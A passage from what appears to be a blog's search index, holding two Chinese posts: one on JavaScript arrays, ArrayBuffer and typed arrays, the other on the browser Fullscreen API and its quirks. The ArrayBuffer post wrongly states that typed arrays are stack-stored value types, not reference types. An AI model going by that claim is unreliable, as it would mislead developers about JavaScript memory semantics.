            <tag> cnblogs </tag>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>你所不知道的JavaScript数组</title>
      <link href="/blog/2014/03/03/cb-javascript-array/"/>
      <url>/blog/2014/03/03/cb-javascript-array/</url>
      
        <content type="html"><![CDATA[<p>相信每一个 javascript 学习者，都会去了解 JS 的各种基本数据类型，数组就是数据的组合，这是一个很基本也十分简单的概念，他的内容没多少，学好它也不是件难事情。但是本文着重要介绍的并不是我们往常看到的 Array，而是 ArrayBuffer。</p><p>我写的很多东西都是因为要完成某些特定的功能而刻意总结的，可以算是备忘，本文也是如此！前段时间一直在研究 Web Audio API 以及语音通信相关的知识，内容侧重于音频流在 AudioContext 各个节点之间的流动情况，而现在要摸清楚音频到流底是个什么样的数据格式，所以对 ArrayBuffer 的研究就显得格外重要了。</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/javascript-array.html">http://www.cnblogs.com/hustskyking/p/javascript-array.html</a>，转载请注明源地址。</p><h3>一、Array 在内存中的堆栈模型</h3><h4>1. Array 的获取</h4><p>Javascript 中如何产生 Array：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="literal">[<span class="identifier">element0</span>, <span class="identifier">element1</span>, <span class="operator">...</span>, <span class="identifier">elementN</span>]</span></span><br><span class="line"><span class="keyword">new</span> <span class="constructor">Array(<span class="params">element0</span>, <span class="params">element1</span>, <span class="operator">...</span>, <span class="params">elementN</span>)</span></span><br><span class="line"><span class="keyword">new</span> <span class="constructor">Array(<span class="params">arrayLength</span>)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接定义，或者通过构造函数创建一个 Array，当然也可以使用其他的手段：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;array&quot;</span>.<span class="built_in">split</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="string">&quot;array&quot;</span>.match(<span class="regexp">/a|r/g</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>等等，方式有很多。但是 Array 内部是个什么样的结构，恐怕很多人还不是很清楚。</p><h4>2. 堆栈模型</h4><p>在数组中我们可以放很多不同数据类型的数据，如：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">21</span>, <span class="string">&quot;李靖&quot;</span>, <span class="keyword">new</span> <span class="built_in">Date</span>(), <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;, , <span class="literal">null</span>];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面这个数组中一次放入了 数字、字符串、对象、函数、undefined 和 null，对于上面的数据接口我们可以具象的描述下：</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">    栈</span><br><span class="line">+---------+                  堆</span><br><span class="line">|<span class="string">   21    </span>|<span class="string">         +-------------------+</span></span><br><span class="line"><span class="string">+---------+         </span>|<span class="string">                   </span>|</span><br><span class="line">|<span class="string">  &quot;李靖&quot; </span>|<span class="string">         </span>|<span class="string">                   </span>|</span><br><span class="line">+---------+         |<span class="string">  +--------+       </span>|</span><br><span class="line">|<span class="string"> [refer] </span>|<span class="string">-----------&gt;</span>|<span class="string"> Object </span>|<span class="string">       </span>|</span><br><span class="line">+---------+         |<span class="string">  +--------+       </span>|</span><br><span class="line">|<span class="string"> [refer] </span>|<span class="string">-----------------&gt;+--------+ </span>|</span><br><span class="line">+---------+         |<span class="string">        </span>|<span class="string">function</span>|<span class="string"> </span>|</span><br><span class="line">|<span class="string">undefined</span>|<span class="string">         </span>|<span class="string">        +--------+ </span>|</span><br><span class="line">+---------+         |<span class="string">                   </span>|</span><br><span class="line">|<span class="string">   null  </span>|<span class="string">         +-------------------+</span></span><br><span class="line"><span class="string">+---------+         Created By Barret Lee</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>JavaScript 的数据类型分为两种，一种是值类型，一种是引用类型，常见的引用类型有 Object 和 Array，数组的储存模型中，如果是诸如 Number、String 之类的值类型数据会被直接压入栈中，而引用类型只会压入对该值的一个索引，用 C 语言的概念来解释就是只保存了数据的指针，这些数据是储存在堆中的某块区间中。栈堆并不是独立的，栈也可以在堆中存放。</p><p>好了，对 Array 的说明就到这里，下面具体说说 ArrayBuffer 的相关知识。</p><h3>二、ArrayBuffer</h3><p>web 是个啥玩意儿，web 要讨论的最基本问题是什么？我觉得有两点，一个是数据，一个是数据传输，至于数据的展示，纷繁复杂，这个应该是 web 上层的东西。而本文要讨论的 ArrayBuffer 就是最基础的数据类型，甚至不能称之为数据类型，它是一个数据容器，需要通过其他方式来读写。</p><p>官方点的定义：</p><blockquote><p>The ArrayBuffer is a data type that is used to represent a generic, fixed-length binary data buffer. You can't directly manipulate the contents of an ArrayBuffer; instead, you create an ArrayBufferView object which represents the buffer in a specific format, and use that to read and write the contents of the buffer.</p><p><strong>表示二进制数据的原始缓冲区，该缓冲区用于存储各种类型化数组的数据。 无法直接读取或写入 ArrayBuffer，但可根据需要将其传递到类型化数组或 DataView 对象 来解释原始缓冲区。</strong></p></blockquote><p>他是一个二进制数据的原始缓冲区，虽然 JavaScript 是弱类型语言，但是他本身是对数据的类型和大小都有限制的，我们需要通过某种数据结构将缓冲区的内容有序的读取出来（写进去）。</p><h4>1. 原始缓冲区的创建</h4><p>通过 ArrayBuffer 这个构造函数可以创建一个原始缓冲区：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">buffer</span>  = <span class="keyword">new</span> ArrayBuffer(<span class="number">30</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从 chrome 控制台可以看到：</p><p><img src="https://images.cnitblog.com/i/387325/201403/031349161314084.jpg" alt=""></p><p>buffer 实例拥有一个 byteLength 的属性，用于获取 buffer 的 size，一个只有 IE11+ 以及 ios6+ 支持的 slice 方法，用于对 buffer 长度进行截取操作。</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="function">ArrayBuffer <span class="title">slice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">unsigned</span> <span class="type">long</span> begin</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">unsigned</span> <span class="type">long</span> end Optional</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以测试这个 DEMO：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">buffer</span> = <span class="keyword">new</span> ArrayBuffer(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> Int32Array(<span class="built_in">buffer</span>);</span><br><span class="line">x[<span class="number">1</span>] = <span class="number">1234</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="built_in">slice</span> = <span class="built_in">buffer</span>.<span class="built_in">slice</span>(<span class="number">4</span>);</span><br><span class="line"><span class="keyword">var</span> y = <span class="keyword">new</span> Int32Array(<span class="built_in">slice</span>);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(y[<span class="number">0</span>]);</span><br><span class="line">x[<span class="number">1</span>] = <span class="number">6789</span>;</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(y[<span class="number">0</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>2. 类型化数组</h4><p>类型化数组类型表示可编制索引和操纵的 ArrayBuffer 对象 的各种视图。 所有数组类型的长度均固定。</p><table><thead><tr><th>名称</th><th>大小（以字节为单位）</th><th>描述</th></tr></thead><tbody><tr><td>Int8Array</td><td>1</td><td>8 位二补码有符号整数</td></tr><tr><td>Uint8Array</td><td>1</td><td>8 位无符号整数</td></tr><tr><td>Int16Array</td><td>2</td><td>16 位二补码有符号整数</td></tr><tr><td>Uint16Array</td><td>2</td><td>16 位无符号整数</td></tr><tr><td>Int32Array</td><td>4</td><td>32 位二补码有符号整数</td></tr><tr><td>Uint32Array</td><td>4</td><td>32 位无符号整数</td></tr><tr><td>Float32Array</td><td>4</td><td>32 位 IEEE 浮点数</td></tr><tr><td>Float64Array</td><td>8</td><td>64 位 IEEE 浮点数</td></tr></tbody></table><p>Int 就是整型，Uint 为无符号整形，Float 为浮点型，这些是 C 语言中的基本概念，我就不具体解释了。由于这些视图化结构都是大同小异，本文只对 Float32Array 类型作说明，读者可以举一反三。</p><p>Float32Array 跟 Array 是十分类似的，只不过他每一个元素都是都是一个 32位（4字节） 的浮点型数据。Float32Array 一旦创建其大小不能再修改。</p><p>我们可以直接创建一个 Float32Array:</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> Float32Array(<span class="number">2</span>);</span><br><span class="line">x[<span class="number">0</span>] = <span class="number">17</span>;</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x[<span class="number">0</span>]); <span class="comment">// 17</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x[<span class="number">1</span>]); <span class="comment">// 0</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x.<span class="built_in">length</span>); <span class="comment">// 2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要有这么一个概念，他依然是一个数组，只不过该数组中的每个元素都是 Float 32 位的数据类型，再如：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> Float32Array([<span class="number">17</span>, <span class="number">-45.3</span>]);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x[<span class="number">0</span>]);  <span class="comment">// 17</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x[<span class="number">1</span>]);  <span class="comment">// -45.29999923706055</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x.<span class="built_in">length</span>); <span class="comment">// 2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们把一个数组的值直接赋给了 x 这个 Float32Array 对象，那么在储存之前会将它转换成一个 32位浮点数。</p><p>由于该类数组的每个元素都是同一类型，所以在堆栈模型中，他们全部会被压入到栈之中，因此类型化数组都是值类型，他并不是引用类型！这个要引起注意，从下面的例子中也可以反映出来：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> Float32Array([<span class="number">17</span>, <span class="number">-45.3</span>]);</span><br><span class="line"><span class="keyword">var</span> y = <span class="keyword">new</span> Float32Array(x);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x[<span class="number">0</span>]); <span class="comment">// 17</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x[<span class="number">1</span>]); <span class="comment">//-45.29999923706055</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x.<span class="built_in">length</span>); <span class="comment">// 2</span></span><br><span class="line">x[<span class="number">0</span>] = <span class="number">-2</span>;</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(y[<span class="number">0</span>]); <span class="comment">// 17, y的值没变</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将 x 的值复制给 y，修改 x[0], y[0] 并没有变化。</p><p>除了上面的方式，我们还可以通过其他方式来创建一个类型化数组：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">buffer</span> = <span class="keyword">new</span> ArrayBuffer(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> Float32Array(<span class="built_in">buffer</span>, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> y = <span class="keyword">new</span> Float32Array(<span class="built_in">buffer</span>, <span class="number">4</span>, <span class="number">1</span>);</span><br><span class="line">x[<span class="number">1</span>] = <span class="number">7</span>;</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(y[<span class="number">0</span>]); <span class="comment">// 7</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解释下这里为什么返回 7.</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="section">       ArrayBuffer（12）</span></span><br><span class="line"><span class="section">+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="section">|0|1|2|3|4|5|6|7|8| | | | |</span></span><br><span class="line"><span class="section">+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line">\              /</span><br><span class="line"><span class="code">  x (Float32Array)</span></span><br><span class="line"><span class="code">  offset：0</span></span><br><span class="line"><span class="code">  byteLength：4</span></span><br><span class="line"><span class="code">  length:2</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"><span class="section">       ArrayBuffer（12）</span></span><br><span class="line"><span class="section">+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="section">|0|1|2|3|4|5|6|7|8| | | | |</span></span><br><span class="line"><span class="section">+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="code">        \       /</span></span><br><span class="line"><span class="code">             y</span></span><br><span class="line"></span><br><span class="line"><span class="code">      Created By Barret Lee</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看了上面的图解还有疑问么？我觉得我不用继续解释了。可以把 ArrayBuffer 的单位看成 1，而 Float32Array 的单位是 4.</p><h4>3. DataView对象</h4><p>DataView 对象对数据的操作更加细致，不过我觉得没啥意思，上面提到的各种类型化数组已经可以基本满足应用了，所以这里就一笔带过，一个简单的示例：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">buffer</span> = <span class="keyword">new</span> ArrayBuffer(<span class="number">12</span>);</span><br><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> DataView(<span class="built_in">buffer</span>, <span class="number">0</span>);</span><br><span class="line">x.setInt8(<span class="number">0</span>, <span class="number">22</span>);</span><br><span class="line">x.setFloat32(<span class="number">1</span>, Math.<span class="literal">PI</span>);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x.getInt8(<span class="number">0</span>)); <span class="comment">// 22</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(x.getFloat32(<span class="number">1</span>)); <span class="comment">// 3.1415927410125732</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果感兴趣，可以移步<a href="http://www.javascripture.com/DataView" target="_blank">http://www.javascripture.com/DataView</a>，作详细了解。</p><h3>三、XHR2 中的 ArrayBuffer</h3><p>ArrayBuffer 的应用特别广泛，无论是 WebSocket、WebAudio 还是 Ajax等等，前端方面只要是处理大数据或者想提高数据处理性能，那一定是少不了 ArrayBuffer 。</p><p>XHR2 并不是什么新东西，可能你用到了相关的特性，却不知这就是 XHR2 的内容。最主要的一个东西就是 <code>xhr.responseType</code>，他的作用是设置响应的数据格式，可选参数有："text"、"arraybuffer"、"blob"或"document"。请注意，设置（或忽略）xhr.responseType = '' 会默认将响应设为"text"。这里存在一个这样的对应关系：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">请求            响应</span><br><span class="line">text            <span class="title class_">DOMString</span></span><br><span class="line">arraybuffer     <span class="title class_">ArrayBuffer</span></span><br><span class="line">blob            <span class="title class_">Blob</span></span><br><span class="line"><span class="variable language_">document</span>        <span class="title class_">Document</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>举个栗子：</p><figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="type">XMLHttpRequest</span>();</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/path/to/image.png&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.responseType = <span class="string">&#x27;arraybuffer&#x27;</span>;</span><br><span class="line"></span><br><span class="line">xhr.onload = <span class="function"><span class="keyword">function</span></span>(e) &#123;</span><br><span class="line">    <span class="comment">// this.response == uInt8Array.buffer</span></span><br><span class="line">    <span class="keyword">var</span> uInt8Array = <span class="keyword">new</span> <span class="type">Uint8Array</span>(<span class="built_in">this</span>.response);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.send();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们在 xhr.responseType 中设置了属性为 arraybuffer，那么在拿到的数据中就可以用类型化数组来接受啦！</p><h3>四、小结</h3><p>本文主要介绍了 Array 在堆栈模型中的存放方式，也详细描述了 ArrayBuffer 这个原始缓冲区的二进制数据类型，在 web 开发中，数据以及数据的储存是一个重要的部分，希望引起注意！</p><p>本文叙述上可能存在错误，请多多斧正！</p><h3>五、参考资料</h3><ul><li><a href="http://www.javascripture.com/ArrayBuffer" target="_blank">http://www.javascripture.com/ArrayBuffer</a></li><li><a href="//developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array" target="_blank">//developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array</a> MDN Array</li><li><a href="http://www.html5rocks.com/zh/tutorials/file/xhr2/" target="_blank">http://www.html5rocks.com/zh/tutorials/file/xhr2/</a> html5rocks</li><li><a href="http://technet.microsoft.com/zh-cn/ie/br212485" target="_blank">http://technet.microsoft.com/zh-cn/ie/br212485</a> MSDN</li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>让你的页面瞬间全屏</title>
      <link href="/blog/2014/03/01/cb-javascript-fullscreen/"/>
      <url>/blog/2014/03/01/cb-javascript-fullscreen/</url>
      
        <content type="html"><![CDATA[<p><span>@update 文章下方有更新，提到了更多全屏的知识以及错误的矫正。</span></p><p><span>页面全屏是一个体验非常棒的功能，他可以让你的视觉焦点聚集在你想关注的元素块上。很多浏览器都支持全屏，按下 F11，哦了！ 页面全屏了~&nbsp;但是本文要说的并不是这种全屏。当页面中有个小 DEMO 或者小游戏要展示的时候，用户期望，这个 DEMO 或者游戏可以在全屏下展示，本文就教你如何来展示。</span></p><p>如果你是非 IE 浏览器进入的该页面，你可能已经看到了页面上发生了一点小变化，多个东西：</p><p><img src="https://images.cnitblog.com/i/387325/201403/010309260367360.png" alt=""></p><p>没错，多了个\进入全屏"的按钮，这就是本文要介绍的内容！</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/javascript-fullscreen.html">http://www.cnblogs.com/hustskyking/p/javascript-fullscreen.html</a>，转载请注明源地址。</p><h3>一、全屏策略</h3><h4>1. 原理</h4><p>一些浏览器提供了元素全屏的接口，这些接口的调用特别简单：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> 进入全屏</span><br><span class="line">element.requestFullScreen();</span><br><span class="line"><span class="regexp">//</span> 退出全屏</span><br><span class="line">document.exitFullscreen(); </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这是 w3c 规范统一的接口，但是浏览器总是那么调皮，内部实现的时候会加上自己厂商的前缀，如：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span> 小狐</span><br><span class="line">element.mozRequestFullScreen();</span><br><span class="line"><span class="regexp">//</span> Chrome</span><br><span class="line">document.webkitCancelFullScreen();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里有两点需要引起注意，W3C 中的退出全屏是 <code>exitFullscreen</code>，而小狐跟 Chrome 使用的是 <code>cancelFullScreen</code>，这里在作判断的时候不要弄错了；再一点就是当我们退出全屏的时候，并不是使用 element 作为退出的对象了，而是使用 document。</p><h4>2. 兼容处理</h4><p>原理是很简单，但是针对浏览器的兼容性写起来还是挺麻烦的，幸好 Chrome 换用 blink内核 之后没有继续加上一个 <code>-blink-</code>，否则开发者心里会有无数个草泥马奔腾的！</p><p>对于进入全屏：</p><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> launchFullScreen(<span class="keyword">element</span>) &#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="type">element</span>.requestFullscreen) &#123;</span><br><span class="line">      <span class="type">element</span>.requestFullscreen();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="type">element</span>.msRequestFullscreen) &#123;</span><br><span class="line">      <span class="type">element</span>.msRequestFullscreen();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="type">element</span>.mozRequestFullScreen) &#123;</span><br><span class="line">      <span class="type">element</span>.mozRequestFullScreen();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="type">element</span>.webkitRequestFullscreen) &#123;</span><br><span class="line">      <span class="type">element</span>.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对于退出全屏：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">cancelFullScreen</span>(<span class="params"></span>) &#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">exitFullscreen</span>) &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">exitFullscreen</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">msExitFullscreen</span>) &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">msExitFullscreen</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">mozCancelFullScreen</span>) &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">mozCancelFullScreen</span>();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">document</span>.<span class="property">webkitExitFullscreen</span>) &#123;</span><br><span class="line">      <span class="variable language_">document</span>.<span class="title function_">webkitExitFullscreen</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;  </span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>3. 浏览器兼容性</h4><p><span>IE 用户就甭看了，刚测试，IE11 不兼容</span>（需要加前缀 ms）。对于浏览器的兼容情况，请戳<a href="//developer.mozilla.org/en/DOM/Using_full-screen_mode#AutoCompatibilityTable" target="_blank">这里</a>。目前 Firefox 兼容，不过有点离谱。他会弹出一个让你全屏的提示，此时确实是全屏的，但当你点击提示中的\允许"时，屏幕又退出了全屏，真是让人匪夷所思。我测试的版本（27.0.1）有这个问题，当然，这是浏览器本身的问题，不用纠结。</p><p><img src="https://images.cnitblog.com/i/387325/201403/010319363967428.png" alt="" width="553" height="195"></p><p>Chrome 对于新特性的支持永远是站在前排，不得不佩服 google 开发工程师的牛掰！</p><h3>二、3 个 bug</h3><h4>1. window 失去焦点</h4><p>当全屏一个元素块的时候，原始状态该元素块可能没有 padding 或者 margin 值，为了让他显示的稍微养眼一些，我们可能会给他主动加上 padding 值，然后在退出全屏的时候在拿到设置的值。但此时，一个 bug 出现鸟，当我们点击全屏页面中的 a 标签，或者触发了某个 <code>window.open</code> 之后，浏览器会失去焦点，跳到新开的页面中，而全屏的页面会退出全屏，搞笑的是我们开始设置的 padding 值他不给我们去掉，这个是令人十分神伤的，<span>不过没关系，有 bug 咱们就打补丁！</span></p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">window.onblur <span class="operator">=</span> function()&#123;</span><br><span class="line">    cancelFullsreen()<span class="comment">;</span></span><br><span class="line">    changeThePadding()<span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>有人会想到，我们在点击 a 链接的时候先 changeThePadding()，再让 a 标签跳走，这种方式是不合理的，因为除了 a 链接会让页面失去焦点之外还有其他的可能（如 window.open）。</p><p><span>@update</span> 因为 bug 3 的存在，这里不能这样改，需要利用浏览器的全屏探测：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">on</span>(<span class="string">&#x27;webkitfullscreenchange mozfullscreenchange msfullscreenchange fullscreenchange&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">document</span>.<span class="property">fullscreenElement</span> &amp;&amp;    <span class="comment">// alternative standard method</span></span><br><span class="line">    !<span class="variable language_">document</span>.<span class="property">mozFullScreenElement</span> &amp;&amp;</span><br><span class="line">    !<span class="variable language_">document</span>.<span class="property">webkitFullscreenElement</span> &amp;&amp;</span><br><span class="line">    !<span class="variable language_">document</span>.<span class="property">msFullscreenElement</span> ) &#123;</span><br><span class="line">        <span class="comment">// 在这里处理 bug        changeThePadding();</span></span><br><span class="line">&#125; &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4>2. 一个貌似可以重现的 bug</h4><p>所谓的可以重现就是，把代码逻辑抽离出来，写个 demo 还能看到 bug。反正我试过好几次，这个 bug 都出现了，懒得写一个 DEMO 重现他。他出现的位置是：我的滚动条是自己设置的样式，当全屏之后，滚动条本应该在页面的最右侧，但是我测试的时候他偶尔会离最右侧有十几个像素，我也不知道为什么。但是当我打开 DevTools 的时候，这十几个像素又奇妙的被缝合了~</p><p><img src="https://images.cnitblog.com/i/387325/201403/010322023845093.png" alt=""></p><p>后来一想，管你呢，这肯定是 google 的工程师没有留意到的位置！既然开打 DevTools 可以修复，那就说明触发 window.resize 也能解决这个问题，好吧，那就这样试试吧：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">newCancelFullscreen</span> <span class="operator">=</span> function()&#123;</span><br><span class="line">    cancelFullscreen()<span class="comment">;</span></span><br><span class="line">    window.onresize()<span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>果然有效，bug 搞定！</p><h4>3. 全屏之后，部分浏览器会在该页面失去焦点</h4><p>这就相当于，全屏之后，触发了 window.blur();</p><h3>三、小结</h3><p>除了上面提到的两个 bug，还有一个值得注意的是，如果你全屏的那个元素块很高但却没有设置</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">element &#123; overflow:<span class="keyword">auto</span>; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>之类的东西，你会发现滚烂你的鼠标也滚不出那块区域。</p><p>本文介绍了如何使用 javascript 将页面中的某个元素调至全屏，并指出了再使用过程中的两个 bug，希望引起注意！</p><h3>四、参考资料</h3><ul><li><a href="http://baidufe.com/" target="_blank">http://baidufe.com/</a> Alien的笔记</li></ul><h4><span>@update 2014/03/01 12:00</span></h4><p>1. Trident 内核的 IE 浏览器是支持的，可以用&nbsp;element.msRequestFullscreen()，退出用&nbsp;<span>msExitFullscreen()</span></p><p>2. 对于全屏的元素可以使用伪元素给他加样式：</p><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="symbol">:-webkit-full-screen</span> <span class="comment">#myvideo &#123;</span></span><br><span class="line">  <span class="symbol">width:</span> <span class="number">100</span>%;</span><br><span class="line">  <span class="symbol">height:</span> <span class="number">100</span>%;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3. 浏览器提供的两个方便开发的东西：</p><p><a href="//developer.mozilla.org/en-US/docs/Web/API/document.mozFullScreenElement" target="_blank">fullscreenElement</a>：如果这个属性为空，则浏览器处于非全屏状态，否则就是处于全屏。</p><p><a href="//developer.mozilla.org/en-US/docs/Web/API/document.mozFullScreenEnabled" target="_blank">fullscreenEnabled</a>：这个属性告诉你浏览器 document 是否可以全屏。</p><p>4. 也可以使用 keydown 来控制全屏，如：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">document.add<span class="constructor">EventListener(<span class="string">&quot;keydown&quot;</span>, <span class="params">function</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (e.keyCode<span class="operator"> == </span><span class="number">13</span>) &#123;</span><br><span class="line">    toggle<span class="constructor">FullScreen()</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对于 toggleFullScreen 函数：</p><figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> toggleFullScreen() &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">!document</span>.fullscreenElement &amp;&amp;    // alternative standard method</span><br><span class="line">      <span class="built_in">!document</span>.mozFullScreenElement &amp;&amp; <span class="built_in">!document</span>.webkitFullscreenElement &amp;&amp; <span class="built_in">!document</span>.msFullscreenElement ) &#123;  // current working methods</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">(document</span>.documentElement.requestFullscreen) &#123;</span><br><span class="line">     <span class="built_in"> document</span>.documentElement.requestFullscreen();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="built_in">(document</span>.documentElement.msRequestFullscreen) &#123;</span><br><span class="line">     <span class="built_in"> document</span>.documentElement.msRequestFullscreen();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> <span class="built_in">(document</span>.documentElement.mozRequestFullScreen) &#123;</span><br><span class="line">     <span class="built_in"> 